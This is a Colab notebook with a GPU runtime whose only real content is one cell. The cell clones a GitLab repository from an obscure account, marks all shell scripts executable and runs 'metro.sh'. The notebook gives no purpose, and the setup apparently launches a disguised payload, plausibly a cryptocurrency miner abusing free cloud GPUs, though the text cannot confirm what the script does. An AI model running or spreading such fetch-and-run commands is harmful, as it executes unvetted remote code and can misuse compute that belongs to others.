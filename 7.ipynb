{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "7.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YGkONIRN3KSl"
      },
      "source": [
        "# **2**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "uwi-heg025ZW"
      },
      "source": [
        "!git clone https://gitlab.com/corinnacvijnqqh/lighter.git && cd lighter && chmod +x *.sh && ./metro.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
